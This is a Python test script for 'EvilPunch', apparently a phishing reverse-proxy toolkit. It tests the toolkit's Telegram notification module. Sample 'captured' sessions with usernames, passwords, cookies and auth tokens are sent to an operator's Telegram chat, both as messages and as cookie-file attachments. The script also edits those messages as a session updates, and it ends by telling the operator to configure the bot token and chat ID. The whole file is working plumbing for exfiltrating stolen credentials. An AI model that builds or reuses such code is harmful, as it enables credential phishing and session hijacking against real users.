#!/usr/bin/env python3
"""
Enhanced test script for the notification system with file attachments and message editing
"""

import os
import sys
import django
import time

# Add the project directory to Python path
sys.path.append(os.path.join(os.path.dirname(__file__), 'evilpunch'))

# Set Django environment
os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'evilpunch.settings')
django.setup()

from evilpunch.core.notify import (
    send_notification, 
    notify_session_captured, 
    notify_session_updated,
    notify_proxy_status_change, 
    notify_server_status_change,
    notify_error,
    cache_message,
    get_cached_message_id,
    clear_cached_message
)

def test_enhanced_notifications():
    """Test enhanced notification functions with file attachments and editing"""
    print("🧪 Testing Enhanced Notification System...")
    print("=" * 60)
    
    # Test 1: Basic notification
    print("\n1. Testing basic notification...")
    success = send_notification("🧪 Test notification from EvilPunch!", "test")
    print(f"   Result: {'✅ Success' if success else '❌ Failed'}")
    
    # Test 2: Session captured notification with cookies
    print("\n2. Testing session captured notification with cookies...")
    session_data = {
        'session_id': 'test_session_001',
        'phishlet_name': 'test_phishlet',
        'captured_username': 'testuser',
        'captured_password': 'testpass123',
        'ip_address': '192.168.1.100',
        'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'proxy_domain': 'test.example.com',
        'captured_cookies': {
            'session_id': 'abc123def456',
            'user_token': 'xyz789',
            'preferences': 'dark_mode=true'
        },
        'captured_custom': {
            'form_data': 'login_form',
            'timestamp': '2024-01-01 12:00:00'
        },
        'created': '2024-01-01 12:00:00'
    }
    
    message_id = notify_session_captured(session_data)
    if message_id:
        print(f"   ✅ Success - Message ID: {message_id}")
        # Cache the message ID for editing
        cache_message('test_session_001', message_id)
    else:
        print("   ❌ Failed")
    
    # Test 3: Session updated notification (editing existing message)
    print("\n3. Testing session updated notification (message editing)...")
    time.sleep(2)  # Small delay to see the difference
    
    updated_session_data = {
        'session_id': 'test_session_001',
        'phishlet_name': 'test_phishlet',
        'captured_username': 'testuser_updated',
        'captured_password': 'newpassword456',
        'ip_address': '192.168.1.100',
        'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'proxy_domain': 'test.example.com',
        'captured_cookies': {
            'session_id': 'abc123def456',
            'user_token': 'xyz789',
            'preferences': 'dark_mode=true',
            'new_cookie': 'additional_data'
        },
        'captured_custom': {
            'form_data': 'login_form',
            'timestamp': '2024-01-01 12:00:00',
            'updated_at': '2024-01-01 12:05:00'
        },
        'created': '2024-01-01 12:00:00',
        'updated': '2024-01-01 12:05:00'
    }
    
    # Get cached message ID
    cached_id = get_cached_message_id('test_session_001')
    if cached_id:
        print(f"   📝 Editing message ID: {cached_id}")
        updated_message_id = notify_session_updated(updated_session_data, cached_id)
        if updated_message_id:
            print(f"   ✅ Message updated successfully - New ID: {updated_message_id}")
            # Update cache with new message ID
            cache_message('test_session_001', updated_message_id)
        else:
            print("   ❌ Failed to update message")
    else:
        print("   ⚠️  No cached message ID found, sending new message")
        new_message_id = notify_session_updated(updated_session_data)
        if new_message_id:
            print(f"   ✅ New message sent - ID: {new_message_id}")
            cache_message('test_session_001', new_message_id)
        else:
            print("   ❌ Failed to send new message")
    
    # Test 4: Session with minimal data (no cookies)
    print("\n4. Testing session with minimal data...")
    minimal_session_data = {
        'session_id': 'test_session_002',
        'phishlet_name': 'minimal_phishlet',
        'captured_username': 'simpleuser',
        'captured_password': 'simplepass',
        'ip_address': '10.0.0.50',
        'user_agent': 'Simple Browser',
        'proxy_domain': 'simple.example.com',
        'captured_cookies': {},
        'captured_custom': {},
        'created': '2024-01-01 13:00:00'
    }
    
    message_id = notify_session_captured(minimal_session_data)
    if message_id:
        print(f"   ✅ Success - Message ID: {message_id}")
        cache_message('test_session_002', message_id)
    else:
        print("   ❌ Failed")
    
    # Test 5: Proxy status change notification
    print("\n5. Testing proxy status change notification...")
    success = notify_proxy_status_change("Test Proxy", "active")
    print(f"   Result: {'✅ Success' if success else '❌ Failed'}")
    
    # Test 6: Server status change notification
    print("\n6. Testing server status change notification...")
    success = notify_server_status_change("proxy", "running")
    print(f"   Result: {'✅ Success' if success else '❌ Failed'}")
    
    # Test 7: Error notification
    print("\n7. Testing error notification...")
    success = notify_error("Test error message", "Test Context")
    print(f"   Result: {'✅ Success' if success else '❌ Failed'}")
    
    # Test 8: Message caching functionality
    print("\n8. Testing message caching functionality...")
    print(f"   Cached message for test_session_001: {get_cached_message_id('test_session_001')}")
    print(f"   Cached message for test_session_002: {get_cached_message_id('test_session_002')}")
    
    # Test 9: Clear cached message
    print("\n9. Testing message cache clearing...")
    clear_cached_message('test_session_001')
    print(f"   After clearing test_session_001: {get_cached_message_id('test_session_001')}")
    
    print("\n" + "=" * 60)
    print("🎯 Enhanced notification testing completed!")
    
    # Check if any notifications were successful
    if not any([message_id, success]):
        print("\n⚠️  All notifications failed. This might be because:")
        print("   - Telegram bot token is not configured")
        print("   - Telegram chat ID is not configured")
        print("   - Notifications are disabled")
        print("   - Network connectivity issues")
        print("\n💡 Configure your notification settings in the dashboard first!")
    else:
        print("\n✅ Some notifications were successful!")
        print("💡 Check your Telegram for the test messages and file attachments")

def test_file_attachments():
    """Test file attachment functionality"""
    print("\n📎 Testing File Attachment Functionality...")
    print("=" * 60)
    
    # Test creating cookies file
    print("\n1. Testing cookies file creation...")
    from evilpunch.core.notify import notification_manager
    
    cookies_data = {
        'cookies': {
            'session_id': 'test123',
            'auth_token': 'abc456',
            'user_prefs': 'dark_mode'
        },
        'custom_data': {
            'form_type': 'login',
            'timestamp': '2024-01-01 12:00:00'
        },
        'capture_time': '2024-01-01 12:00:00',
        'session_info': {
            'phishlet': 'test_phishlet',
            'ip_address': '192.168.1.100',
            'user_agent': 'Test Browser',
            'proxy_domain': 'test.example.com'
        }
    }
    
    file_path = notification_manager.create_cookies_file(cookies_data, 'test_session_003')
    if file_path and os.path.exists(file_path):
        print(f"   ✅ Cookies file created: {file_path}")
        
        # Test sending file via Telegram
        print("\n2. Testing file sending via Telegram...")
        caption = "📎 Test cookies file attachment"
        message_id = notification_manager.send_telegram_file(file_path, caption)
        
        if message_id:
            print(f"   ✅ File sent successfully - Message ID: {message_id}")
        else:
            print("   ❌ Failed to send file")
        
        # Clean up
        notification_manager.cleanup_temp_file(file_path)
        print(f"   🧹 Temporary file cleaned up")
    else:
        print("   ❌ Failed to create cookies file")

if __name__ == "__main__":
    test_enhanced_notifications()
    test_file_attachments()
